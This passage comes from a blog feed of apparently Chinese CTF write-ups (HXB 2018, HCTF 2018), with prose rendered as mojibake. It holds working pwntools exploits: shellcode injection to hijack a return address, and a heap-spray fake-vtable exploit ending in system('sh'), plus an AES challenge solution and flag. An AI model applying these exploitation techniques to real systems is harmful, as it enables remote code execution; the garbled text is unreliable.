                     data-src="/img/hxb2018online14.png"
                      alt="image"
                ></p>
<p>å•¥ä¹Ÿæ²¡å¼€ï¼Œåˆ©ç”¨å°±æœ‰å¾ˆå¤šæ–¹å¼äº†ï¼Œæˆ‘é€‰æ‹©åœ¨ BSS æ®µä¸Šå†™ä¸€äº› shellcode ï¼Œç„¶ååŠ«æŒè¿”å›åœ°å€åˆ° shellcode ä¸Šé¢ã€‚  </p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">context(log_level=<span class="string">&quot;DEBUG&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;47.94.194.131&quot;</span>,<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;\x33\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;format\n&quot;</span>)</span><br><span class="line">payload1 = <span class="string">&quot;:&quot;</span> + p32(<span class="number">0x0804a1fb</span>) + <span class="string">&quot;$*&quot;</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&quot;match\n&quot;</span>)</span><br><span class="line">payload2 = <span class="string">&quot;Before use it, understand it first.&quot;</span> + p32(<span class="number">0x0804a1fb</span>) * <span class="number">220</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.recvuntil(<span class="string">&quot;[Y/n]\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;Y&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;format\n&quot;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.recvuntil(<span class="string">&quot;match\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;fuck you!&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;[Y/n]\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;n&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<p>æ‹¿åˆ° shellï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/hxb2018online15.png"
                      alt="image"
                ></p>
<h3 id="2-hash-burger"><a href="#2-hash-burger" class="headerlink" title="2. hash burger"></a>2. hash burger</h3><p>è¿™é“é¢˜æ˜¯ SECCON 2017 çš„åŸé¢˜ï¼Œæ¶‰åŠçš„æŠ€æœ¯æ˜¯å †å–·å°„ï¼Œæš‚æ—¶æ²¡æœ‰ç ”ç©¶ã€‚</p>
<p><a class="link"   href="https://github.com/SECCON/SECCON2017_online_CTF/tree/0a8bbd28544fbd89bed0f0e3eafa7b09a0165a6b/pwn/300_hash_burger" >é“¾æ¥<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># CRC reverse module start.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># A library with misc. data manipulation functions</span></span><br><span class="line"><span class="comment">#  (c) 2005 - Intrepid Software</span></span><br><span class="line"><span class="comment">#   Bas Westerbaan &lt;bas.westerbaan@gmail.com&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> <span class="string">&#x27;TOO LONG&#x27;</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment"># Exploit start. Merged files in convinience.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"></span><br><span class="line">HOST, PORT = <span class="string">&#x27;47.107.237.73&#x27;</span>, <span class="number">8888</span></span><br><span class="line">r = remote(HOST, PORT)</span><br><span class="line"><span class="comment">#r = process(&quot;./challenge&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">key, value</span>):</span><br><span class="line">	menu_string=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">	r.sendline(menu_string)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(value))</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">str</span>(value)[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">&#x27;123456789&#x27;</span>:</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	r.sendline(key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">collision</span>(<span class="params"><span class="built_in">hash</span>, prefix=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">	i = <span class="number">0</span></span><br><span class="line">	crc = Crc32Provider()</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		crc.reset()</span><br><span class="line">		crc.update(prefix + <span class="built_in">str</span>(i))</span><br><span class="line">		<span class="keyword">yield</span> prefix + <span class="built_in">str</span>(i) + crc.patch(<span class="built_in">hash</span>)</span><br><span class="line">		i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;with \&#x27;&#x27;</span>)</span><br><span class="line">prefix = r.recvuntil(<span class="string">&#x27;\&#x27;&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate</span>(<span class="params">prefix</span>):</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Generating POW&#x27;</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    z = [prefix, <span class="literal">None</span>]</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            z[<span class="number">1</span>] = <span class="string">&#x27;%06x&#x27;</span> % i</span><br><span class="line">            <span class="keyword">if</span> sha1(<span class="string">&#x27;&#x27;</span>.join(z)).digest().startswith(<span class="string">&#x27;\x00&#x27;</span>):</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">    p = <span class="string">&#x27;&#x27;</span>.join(z)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">p = generate(prefix)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;POW generated: %r&#x27;</span> % p[:<span class="number">100</span>]</span><br><span class="line">r.sendline(p)</span><br><span class="line"></span><br><span class="line"><span class="comment">###############################################################################</span></span><br><span class="line"><span class="comment"># Vulnerability: HashMap OOB access for a large hash</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># In this program, HashMap operates in open addressing mode.</span></span><br><span class="line"><span class="comment"># It means, if same CRC32 hash exists in table, it looks for next entry.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># HashMap::get : it correctly does next_index = (cur_index + 1) % nbuckets;</span></span><br><span class="line"><span class="comment"># HashMap::set : next_index = cur_index + 1; &lt;-- omg</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># HashMap::set has OOB access for large hash, and Key-&gt;compare() is virtual.</span></span><br><span class="line"><span class="comment"># struct HashMap &#123; std::vector keys; Pair *buckets[4096]; &#125;</span></span><br><span class="line"><span class="comment"># struct Pair    &#123; const char *value; Key *key; &#125;</span></span><br><span class="line"><span class="comment"># So we can make a fake object with fake vftable to modify PC.</span></span><br><span class="line"><span class="comment"># To do this...</span></span><br><span class="line"><span class="comment">###############################################################################</span></span><br><span class="line"><span class="comment"># Step 1. Creating a fake hashmap entries</span></span><br><span class="line"><span class="comment"># HashMap-&gt;buckets[4096, 4097] = &lt;user controlled data&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1-1. preparing a user-controllable area right after the hashmap</span></span><br><span class="line">r.sendline(<span class="string">&#x27;9&#x27;</span>*<span class="number">64</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1-2. It fills last(4095th) entry in the hashmap.</span></span><br><span class="line">c = collision(<span class="number">0xffff</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">	<span class="built_in">print</span> `c.<span class="built_in">next</span>()`</span><br><span class="line">add(c.<span class="built_in">next</span>(), <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r.interactive()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1-3. This is for rearranging recently-freed fastbins..</span></span><br><span class="line"><span class="comment">#      for achieving a user-controlled area right after the hashmap</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">	r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	r.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># At this point, the heap area will be:</span></span><br><span class="line"><span class="comment"># ------------------------------------------------</span></span><br><span class="line"><span class="comment"># | HashMap map ...  | 40byte freed fastbin | .. |</span></span><br><span class="line"><span class="comment"># ------------------------------------------------</span></span><br><span class="line"><span class="comment"># In my exploit, 4096th, 4097th will be</span></span><br><span class="line"><span class="comment"># 1) key: NULL, value: 0x29?</span></span><br><span class="line"><span class="comment"># 2) key: buf,  value: NULL</span></span><br><span class="line"><span class="comment"># I did heap spray for a fake objects.</span></span><br><span class="line">buf = <span class="number">0x2500008</span></span><br><span class="line">obj = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># - This is first pair. value will be uncontrollable chunk size object.</span></span><br><span class="line">obj += p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># - This is the second pair. It&#x27;s **STAGE 1** payload which overwrites:</span></span><br><span class="line"><span class="comment">#   ::map = new StringKey(obj)</span></span><br><span class="line">obj += p64(<span class="number">0</span>) + p64(buf)</span><br><span class="line"><span class="comment"># - For fitting the fastbin size (this area is freed as fastbin before)</span></span><br><span class="line">obj = obj.ljust(<span class="number">34</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line"><span class="comment">#   and.. reversing CRC for convinient OOB.</span></span><br><span class="line">obj = collision(<span class="number">0xffff</span>,obj).<span class="built_in">next</span>()</span><br><span class="line"><span class="comment"># This locates two pair above, sets first pair to key: `obj`, value: &quot;shrimp&quot;</span></span><br><span class="line"><span class="comment"># Fills buckets[4096].</span></span><br><span class="line">add(obj, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Below is fake C++ objects &amp; fake hashmap bucket item pairs.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># These are three targets to write with a heap address (StringKey object)</span></span><br><span class="line">target1 = <span class="number">0x605880</span>     <span class="comment"># HashMap     map = heap</span></span><br><span class="line">target2 = <span class="number">0x6058a0</span>     <span class="comment"># std::string pow.ptr = heap</span></span><br><span class="line">target3 = <span class="number">0x6058b0</span> + <span class="number">1</span> <span class="comment"># std::string pow.capacity = heap &lt;&lt; 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload2 will be placed at [x &amp; ~0xfff for x in (heap_base + A, heap_base + B, 0x1000)]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage 1 object: ::map = new StringKey(obj)</span></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(buf + <span class="number">24</span>) + p64(target1) + p64(<span class="number">0</span>) + p64(<span class="number">0x40201c</span>)</span><br><span class="line">payload2 = payload2.ljust(<span class="number">48</span>)</span><br><span class="line"><span class="comment"># Stage 2 objects:</span></span><br><span class="line"><span class="comment"># 2-1. leak(arbitrary address)</span></span><br><span class="line">payload2 += p64(buf + <span class="number">48</span>) + p64(<span class="number">0x4014e0</span>)</span><br><span class="line"><span class="comment"># 2-2. ::pow.ptr = new StringKey(obj)</span></span><br><span class="line">payload2 += p64(buf + <span class="number">56</span> + <span class="number">24</span>) + p64(target2) + p64(<span class="number">0</span>) + p64(<span class="number">0x40201c</span>)</span><br><span class="line"><span class="comment"># 2-3. ::pow.capacity = new StringKey(obj) &lt;&lt; 8</span></span><br><span class="line">payload2 += p64(buf + <span class="number">88</span> + <span class="number">24</span>) + p64(target3) + p64(<span class="number">0</span>) + p64(<span class="number">0x40201c</span>)</span><br><span class="line"><span class="comment"># 2-4. *calls proof_of_work() for arbitrary write in ::map*</span></span><br><span class="line">payload2 += p64(buf + <span class="number">128</span>) + p64(<span class="number">0x401a49</span>)</span><br><span class="line"><span class="comment"># This null pointers are used for 1, 2-2, 2-3.</span></span><br><span class="line">payload2 = payload2.ljust(<span class="number">0x100</span>) + p64(<span class="number">0</span>) * <span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Let me explain this shortly.</span></span><br><span class="line"><span class="comment"># 0x4014e0 is atoi. It&#x27;ll return 8 because &lt;rdi&gt; has p64(0x2500048).</span></span><br><span class="line"><span class="comment"># 0x40201c is HashMap::set. I used this to overwrite any pointer to a heap ptr.</span></span><br><span class="line"><span class="comment"># 0x401a49 is proof_of_work for arbitrary write in heap area.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage 2. Calling a fake entry via HashMap::get</span></span><br><span class="line"><span class="comment"># Since ::map is now a dangling heap pointer, I can provide some fake entries.</span></span><br><span class="line"><span class="comment"># In this case, payload will be at buckets[10~].</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Below is fake hashmap bucket entries &amp; heap spray</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x605018</span>) + p64(buf + <span class="number">40</span>) + p64(<span class="number">0x605880</span>) + p64(buf + <span class="number">40</span>) + p64(<span class="number">0</span>) + p64(buf + <span class="number">56</span>) + p64(<span class="number">0</span>) + p64(buf + <span class="number">88</span>) + p64(<span class="number">0</span>) + p64(buf + <span class="number">120</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x1000</span> - <span class="number">0xe90</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This is also used for heap spray.</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(payload) &lt; <span class="number">0xf000</span>:</span><br><span class="line">    payload += payload2.ljust(<span class="number">0x1000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># It&#x27;s calculated to fill buf address.</span></span><br><span class="line">cnt = (<span class="number">1</span>&lt;&lt;<span class="number">26</span>)/<span class="number">0x10000</span></span><br><span class="line"><span class="built_in">print</span> cnt</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cnt):</span><br><span class="line">    sys.stdout.write(<span class="string">&#x27;Spraying heap - %4d (%02.2f%% done)\r\n&#x27;</span>%(i + <span class="number">1</span>, <span class="number">1.0</span>*i/cnt*<span class="number">100</span>))</span><br><span class="line">    <span class="comment">#sleep(0.5)</span></span><br><span class="line">    add(payload.ljust(<span class="number">0x10000</span>-<span class="number">1</span>-<span class="number">8</span>), <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Triggers buckets[4097]-&gt;compare().</span></span><br><span class="line">add(c.<span class="built_in">next</span>(), <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage 2-1. Now ::map is modified, so we select some bucket and trigger it.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># map-&gt;buckets[10]-&gt;compare() --&gt; libc leak</span></span><br><span class="line">r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">r.sendline(collision(<span class="number">10</span>).<span class="built_in">next</span>())</span><br><span class="line">r.recvuntil(<span class="string">&#x27;You ordered &#x27;</span>)</span><br><span class="line">setvbuf = u64(r.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc6.so&#x27;</span>)</span><br><span class="line">libc.address = setvbuf - libc.symbols[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># map-&gt;buckets[11]-&gt;compare() --&gt; heap base leak</span></span><br><span class="line">r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">r.sendline(collision(<span class="number">11</span>).<span class="built_in">next</span>())</span><br><span class="line">r.recvuntil(<span class="string">&#x27;You ordered &#x27;</span>)</span><br><span class="line">heap = u64(r.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(heap)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="comment"># map-&gt;buckets[12]-&gt;compare() --&gt; ::pow.ptr = new StringKey()</span></span><br><span class="line">r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">r.sendline(collision(<span class="number">12</span>).<span class="built_in">next</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment"># map-&gt;buckets[13]-&gt;compare() --&gt; ::pow.capacity = new StringKey() &lt;&lt; 8</span></span><br><span class="line">r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">r.sendline(collision(<span class="number">13</span>).<span class="built_in">next</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment"># map-&gt;buckets[14]-&gt;compare() --&gt; proof_of_work()</span></span><br><span class="line">r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">r.sendline(collision(<span class="number">14</span>).<span class="built_in">next</span>())</span><br><span class="line">r.recvuntil(<span class="string">&#x27;with \&#x27;&#x27;</span>)</span><br><span class="line">prefix = r.recvuntil(<span class="string">&quot;&#x27;&quot;</span>, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># proof_of_work() -&gt; map-&gt;buckets[15] = 0x??007368-8</span></span><br><span class="line"><span class="comment"># 0x??007368-8 --&gt; 0x??007368 (&quot;sh\x00?&quot;) --&gt; system(&quot;sh&quot;)</span></span><br><span class="line">addr = (heap + <span class="number">0xffffff</span>) &amp; ~<span class="number">0xffffff</span></span><br><span class="line">addr += u16(<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line">obj = prefix + <span class="string">&#x27;\x00&#x27;</span> * <span class="number">16</span> * <span class="number">13</span> + p64(<span class="number">0</span>) + p64(addr - <span class="number">8</span>) + <span class="string">&#x27;a&#x27;</span> * (addr - <span class="number">8</span> - heap - <span class="number">280</span>) + p64(addr) + p64(system)</span><br><span class="line">r.sendline(generate(obj))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="Common-Crypto"><a href="#Common-Crypto" class="headerlink" title="Common Crypto"></a>Common Crypto</h3><p>æ ‡å‡†çš„ AES åŠ å¯†ï¼Œå…ˆè¾“å…¥ flag ï¼Œç„¶åæŠŠ flag AES åŠ å¯†ï¼Œæœ€åå’Œå¯†æ–‡è¿›è¡Œæ¯”è¾ƒï¼Œé€šè¿‡åˆ†æåŠ å¯†å‡½æ•°ï¼Œä¸éš¾å¾—å‡ºç§˜é’¥</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> __fastcall <span class="title function_">sub_140001000</span><span class="params">(_BYTE *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *v1; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// r11</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// er10</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// r14</span></span><br><span class="line">  __int64 v5; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v6; <span class="comment">// bl</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v7; <span class="comment">// di</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v8; <span class="comment">// si</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v9; <span class="comment">// bp</span></span><br><span class="line">  __int64 v10; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">char</span> v11; <span class="comment">// bl</span></span><br><span class="line">  __int64 v12; <span class="comment">// rax</span></span><br><span class="line">  __int64 v13; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">char</span> result; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  v1 = a1 + <span class="number">18</span>;</span><br><span class="line">  *a1 = byte_14001DA40;</span><br><span class="line">  v2 = <span class="number">4</span>;</span><br><span class="line">  a1[<span class="number">1</span>] = byte_14001DA41;</span><br><span class="line">  v3 = <span class="number">16</span>;</span><br><span class="line">  v4 = <span class="number">4</span>i64;</span><br><span class="line">  a1[<span class="number">2</span>] = byte_14001DA42;</span><br><span class="line">  a1[<span class="number">3</span>] = byte_14001DA43;</span><br><span class="line">  a1[<span class="number">4</span>] = byte_14001DA44;</span><br><span class="line">  a1[<span class="number">5</span>] = byte_14001DA45;</span><br><span class="line">  a1[<span class="number">6</span>] = byte_14001DA46;</span><br><span class="line">  a1[<span class="number">7</span>] = byte_14001DA47;</span><br><span class="line">  a1[<span class="number">8</span>] = byte_14001DA48;</span><br><span class="line">  a1[<span class="number">9</span>] = byte_14001DA49;</span><br><span class="line">  a1[<span class="number">10</span>] = byte_14001DA4A;</span><br><span class="line">  a1[<span class="number">11</span>] = byte_14001DA4B;</span><br><span class="line">  a1[<span class="number">12</span>] = byte_14001DA4C;</span><br><span class="line">  a1[<span class="number">13</span>] = byte_14001DA4D;</span><br><span class="line">  a1[<span class="number">14</span>] = byte_14001DA4E;</span><br><span class="line">  a1[<span class="number">15</span>] = byte_14001DA4F;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = v3 - <span class="number">4</span>;</span><br><span class="line">    v6 = a1[v5];</span><br><span class="line">    v7 = a1[(v5 + <span class="number">1</span>)];</span><br><span class="line">    v8 = a1[(v5 + <span class="number">2</span>)];</span><br><span class="line">    v9 = a1[(v5 + <span class="number">3</span>)];</span><br><span class="line">    <span class="keyword">if</span> ( !(v2 &amp; <span class="number">3</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = v6;</span><br><span class="line">      v11 = RijnDael_AES_LONG[v7];</span><br><span class="line">      v7 = RijnDael_AES_LONG[v8];</span><br><span class="line">      v12 = v9;</span><br><span class="line">      v9 = *(v10 + <span class="number">0x14001AC50</span>i64);</span><br><span class="line">      v8 = *(v12 + <span class="number">0x14001AC50</span>i64);</span><br><span class="line">      v6 = RijnDael_AES_LONG[(v4 &gt;&gt; <span class="number">2</span>) + <span class="number">512</span>] ^ v11;</span><br><span class="line">    &#125;</span><br><span class="line">    v13 = v3 - <span class="number">16</span>;</span><br><span class="line">    ++v2;</span><br><span class="line">    ++v4;</span><br><span class="line">    *(v1 - <span class="number">2</span>) = v6 ^ a1[v13];</span><br><span class="line">    v3 += <span class="number">4</span>;</span><br><span class="line">    *(v1 - <span class="number">1</span>) = v7 ^ a1[(v13 + <span class="number">1</span>)];</span><br><span class="line">    *v1 = v8 ^ a1[(v13 + <span class="number">2</span>)];</span><br><span class="line">    result = v9 ^ a1[(v13 + <span class="number">3</span>)];</span><br><span class="line">    v1[<span class="number">1</span>] = result;</span><br><span class="line">    v1 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v3 &lt; <span class="number">0xB0</span> );</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>ç§˜é’¥å°±åœ¨ byte_14001DA40 å¼€å§‹çš„åœ°å€ç©ºé—´å†…ï¼Œå°†ä»–ä»¬æå–å‡ºæ¥ï¼Œç„¶åæŠŠå¯†æ–‡è§£å¯†(ä¸çŸ¥é“æ˜¯ä¸æ˜¯å¯†é’¥ä¸å¯è§çš„åŸå› ï¼Œä½¿ç”¨ python è„šæœ¬ä¸èƒ½è§£å¯†å‡ºæ˜æ–‡ï¼Œæˆ‘ä½¿ç”¨äº† PYG å¯†ç å·¥å…·å¯ä»¥æ­£å¸¸è§£å¯†)ã€‚<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/hxb2018online16.png"
                      alt="image"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/hxb2018online17.png"
                      alt="image"
                ></p>
<p>ä¸ºä»€ä¹ˆåªæœ‰ä¸€åŠ flagï¼Ÿ AES åŠ å¯†å¯†æ–‡é•¿åº¦åº”è¯¥æ˜¯ 16 ä¸ªå­—èŠ‚ï¼Œè€Œç»™å‡ºçš„å¯†æ–‡æ˜æ˜¾å¤šäº 16 ä¸ªå­—èŠ‚ï¼Œä»”ç»†è§‚å¯Ÿå‰©ä½™çš„å­—ç¬¦å‘ç°éƒ½åœ¨ ASCII èŒƒå›´å†…ï¼Œç›´æ¥è½¬æ¢æˆå­—ç¬¦å³å¯å¾—åˆ° flagã€‚</p>
<p>hxb2018{853ecfe52aeb60989e8d3351</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/hxb2018online18.png"
                      alt="image"
                ></p>
<p>æœ€åç¼ºäº†ä¸€ä¸ªæ‹¬å·ï¼Œè¡¥ä¸Šå°±å¥½äº†ã€‚</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>HCTF 2018</title>
    <url>/2018/11/09/HCTF2018/</url>
    <content><![CDATA[<p>å’Œå¸ˆå‚…ä»¬æ‰“äº†ä¸€å¤©åŠçš„ HCTFï¼Œé¢˜ç›®è´¨é‡å¾ˆé«˜ï¼Œæ„Ÿè°¢æ­ç”µçš„å¸ˆå‚…ä»¬å¸¦æ¥çš„ç²¾å½©æ¯”èµ›ã€‚</p>
<span id="more"></span>


<h2 id="the-end"><a href="#the-end" class="headerlink" title="the_end"></a>the_end</h2><p>è¿™é¢˜å¤§æ¦‚ä¸€çœ‹æ„Ÿè§‰å¾ˆç®€å•ï¼ŒIDAçš„ä¼ªä»£ç å¦‚ä¸‹ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  signed int i; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  void *buf; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  sleep(0);</span><br><span class="line">  printf(&quot;here is a gift %p, good luck ;)\n&quot;, &amp;sleep);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  close(1);</span><br><span class="line">  close(2);</span><br><span class="line">  for ( i = 0; i &lt;= 4; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    read(0, &amp;buf, 8uLL);</span><br><span class="line">    read(0, buf, 1uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  exit(1337);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
